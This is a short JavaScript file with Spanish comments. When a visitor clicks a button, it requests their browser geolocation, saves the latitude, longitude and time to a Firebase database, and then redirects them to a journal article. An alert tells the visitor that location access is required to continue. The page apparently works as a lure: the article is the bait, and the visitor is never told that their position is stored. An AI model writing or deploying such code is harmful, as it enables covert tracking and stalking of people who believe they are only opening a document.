// Importar Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "TU_AUTH_DOMAIN",
    databaseURL: "TU_DATABASE_URL",
    projectId: "TU_PROJECT_ID",
    storageBucket: "TU_STORAGE_BUCKET",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Función para obtener ubicación
function obtenerUbicacion() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                let timestamp = new Date().toLocaleString();

                // Guardar en Firebase
                push(ref(database, "ubicaciones"), {
                    latitud: lat,
                    longitud: lon,
                    fecha: timestamp
                }).then(() => {
                    console.log("Ubicación guardada:", lat, lon);
                    
                    // Redirigir a la URL final
                    window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
                }).catch(error => {
                    console.error("Error al guardar ubicación:", error);
                });

            },
            function(error) {
                alert("Debes permitir el acceso a la ubicación para continuar.");
            }
        );
    } else {
        alert("Tu navegador no soporta geolocalización.");
    }
}

// Agregar evento al botón
document.getElementById("btnUbicacion").addEventListener("click", obtenerUbicacion);
